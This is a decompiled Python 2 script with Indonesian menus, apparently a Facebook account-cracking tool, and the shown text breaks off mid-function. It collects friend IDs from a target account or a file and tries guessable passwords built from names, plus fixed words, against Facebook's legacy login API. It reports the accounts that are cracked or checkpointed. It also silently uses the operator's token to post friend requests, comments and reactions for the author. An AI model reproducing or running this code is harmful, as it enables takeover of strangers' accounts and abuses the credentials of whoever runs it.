# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Jan  8 2021, 21:22:55) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: /sdcard/2020.py
# Compiled at: 2020-12-29 05:56:06
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 202.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; U; Android 8.1; xx-xx; CPH1809 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36')]

def keluar():
    print '[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)


logo = '\n\x1b[1;97m \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m \xe2\x95\x91  \x1b[1;97m_ _ _ _ _ _    __ ________________________\x1b[1;97m\xe2\x95\x91  \n\x1b[1;97m \xe2\x95\x91  \x1b[1;97m| | | | | |    |  |___|  | |____| |___|  |\x1b[1;97m\xe2\x95\x91\n\x1b[1;97m \xe2\x95\x91  \x1b[1;97m| |_| | | |    |  |   |  | |____| |   |  |\x1b[1;97m\xe2\x95\x91\n\x1b[1;97m \xe2\x95\x91  \x1b[1;97m| |_| | | |____|  |   |  | | || | |   |  |\x1b[1;97m\xe2\x95\x91\n\x1b[1;97m \xe2\x95\x91  \x1b[1;97m|_| |_|_|_|____|__|   |__| |_||_| |   |__|\x1b[1;97m\xe2\x95\x91\n\x1b[1;97m \xe2\x95\x91                                                                \xe2\x95\x91\n\x1b[1;97m \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;97m \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m \xe2\x95\x91 KENTOD : \xf0\x9d\x99\xb7\xf0\x9d\x99\xb8\xf0\x9d\x99\xbb\xf0\x9d\x99\xbc\xf0\x9d\x99\xb0\xf0\x9d\x99\xbd \xf0\x9d\x99\xbc\xf0\x9d\x99\xb0\xf0\x9d\x9a\x84\xf0\x9d\x99\xbb\xf0\x9d\x99\xb0\xf0\x9d\x99\xbd\xf0\x9d\x99\xb0\xf0\x9d\x9f\xbd\xf0\x9d\x9f\xb8                 \xe2\x95\x91               \n\x1b[1;97m \xe2\x95\x91 Babi : \xf0\x9d\x9a\x91\xf0\x9d\x9a\x9d\xf0\x9d\x9a\x9d\xf0\x9d\x9a\x99\xf0\x9d\x9a\x9c://\xf0\x9d\x9a\x90\xf0\x9d\x9a\x92\xf0\x9d\x9a\x9d\xf0\x9d\x9a\x91\xf0\x9d\x9a\x9e\xf0\x9d\x9a\x8b.\xf0\x9d\x9a\x8c\xf0\x9d\x9a\x98\xf0\x9d\x9a\x96/\xf0\x9d\x9a\x96\xf0\x9d\x9a\x8a\xf0\x9d\x9a\x97-\xf0\x9d\x9a\x91\xf0\x9d\x9a\x8e\xf0\x9d\x9a\x96\xf0\x9d\x9a\x94\xf0\x9d\x9a\x8e\xf0\x9d\x9a\x9b\xf0\x9d\x9f\xbd\xf0\x9d\x9f\xb8. \xe2\x95\x91               \n\x1b[1;97m \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d '

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m]\x1b[1;93m Sedang Masuk\x1b[1;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;97m \xe2\x95\x94                                     \xe2\x95\x97'
    print '\x1b[1;97m  [\x1b[1;97m01\x1b[1;97m]\x1b[1;96m\x1b[1;97m Login Pakai Token Facebook'
    print '\x1b[1;97m  [\x1b[1;91m00\x1b[1;97m]\x1b[1;96m\x1b[1;97m Keluar'
    print '\x1b[1;97m \xe2\x95\x9a                                     \xe2\x95\x9d'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;97m [\x1b[1;91mPilih\x1b[1;97mNomor?\x1b[1;97m]\x1b[1;97m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m \x1b[1;97mToken Facebook? : \x1b[1;93m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\x1b[1;97m Jangan Lupa Follow Akun Pribadi Saya :)')
        jalan('\x1b[1;97m[\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;92m Sedang Login....Login Berhasil')
        os.system('xdg-open https://m.facebook.com/xxx.hilmanxd')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] \x1b[1;93mToken Salah !'
        time.sleep(1.0)
        masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;39m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100041160843927'
    una2 = '100051456593855'
    kom = 'Izin Pakai script lu Bang Hilman \xf0\x9f\x98\x81\xf0\x9f\x98\x81'
    reac = 'LOVE'
    post = '420807329301292'
    post2 = '114281130297106'
    kom2 = 'Izin Pakai script lu bang HilmanXD\xf0\x9f\x99\x8f'
    reac2 = 'ANGRY'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak ada koneksi'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Nama Akun Facebook Anda:\x1b[1;97m\xc2\xb7\x1b[1;97m ' + nama
    print '\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m User ID Akun Anda:\x1b[1;97m\xc2\xb7\x1b[1;97m ' + id
    print '\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Tanggal Lahir Facebook Anda:\x1b[1;97m\xc2\xb7\x1b[1;97m ' + a['birthday']
    print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m [\x1b[1;97m01\x1b[1;97m]\x1b[1;97m\x1b[1;97m Crack ID Indo'
    print '\x1b[1;97m [\x1b[1;97m02\x1b[1;97m]\x1b[1;97m\x1b[1;97m Crack ID Group'
    print '\x1b[1;97m [\x1b[1;97m03\x1b[1;97m]\x1b[1;97m\x1b[1;97m Ambil ID'
    print '\x1b[1;97m [\x1b[1;97m04\x1b[1;97m]\x1b[1;97m\x1b[1;97m Ikuti Saya di Facebook'
    print '\x1b[1;97m [\x1b[1;91m00\x1b[1;97m]\x1b[1;97m\x1b[1;97m Logout'
    print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m ')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Bener KONTOL !'
        pilih()
    elif unikers == '1' or unikers == '01':
        indo()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        dump()
    elif unikers == '4' or unikers == '04':
        saya()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Menghapus Token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih()


def indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m [\x1b[1;97m01\x1b[1;97m]\x1b[1;97m\x1b[1;97m Crack dari ID Publik / Teman'
    print '\x1b[1;97m [\x1b[1;97m02\x1b[1;97m]\x1b[1;97m\x1b[1;97m Crack dari File'
    print '\x1b[1;97m [\x1b[1;91m00\x1b[1;97m]\x1b[1;97m\x1b[1;97m Kembali'
    print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    pilih_indo()


def pilih_indo():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Bener KONTOL !'
        pilih_indo()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
            idt = raw_input('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] User ID Target Lu : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] Nama Akun      : ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] ID Publik / Teman Tidak Ada !'
                raw_input('\n[ Kembali ]')
                indo()
            except requests.exceptions.ConnectionError:
                print '[!] Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            try:
                print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                idlist = raw_input('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] Nama File Target : ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] File tidak ada ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[!] File tidak ada !'
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
                indo()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
            pilih_indo()
        print '\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] Total ID       : ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m \x1b[1;41;97m BERHENTI PROSES,KETIK CTRL+Z.MAKASIH DEK :) \x1b[0m'
    print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H:%M:%S')))
        sys.stdout.flush()
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            c = json.loads(a.text)
            pass1 = c['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass1 + ' \xe2\x80\xa2 ' + c['name']
                oks.append(user)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass1 + ' \xe2\x80\xa2 ' + c['name']
                cekpoint.append(user)
            else:
                pass2 = c['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass2 + ' \xe2\x80\xa2 ' + c['name']
                    oks.append(user)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass2 + ' \xe2\x80\xa2 ' + c['name']
                    cekpoint.append(user)
                else:
                    pass3 = c['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass3 + ' \xe2\x80\xa2 ' + c['name']
                        oks.append(user)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass3 + ' \xe2\x80\xa2 ' + c['name']
                        cekpoint.append(user)
                    else:
                        pass4 = c['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass4 + ' \xe2\x80\xa2 ' + c['name']
                            oks.append(user)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass4 + ' \xe2\x80\xa2 ' + c['name']
                            cekpoint.append(user)
                        else:
                            pass5 = c['last_name'] + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass5 + ' \xe2\x80\xa2 ' + c['name']
                                oks.append(user)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass5 + ' \xe2\x80\xa2 ' + c['name']
                                cekpoint.append(user)
                            else:
                                pass6 = 'kontol'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass6 + ' \xe2\x80\xa2 ' + c['name']
                                    oks.append(user)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass6 + ' \xe2\x80\xa2 ' + c['name']
                                    cekpoint.append(user)
                                else:
                                    pass7 = 'Sayang'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
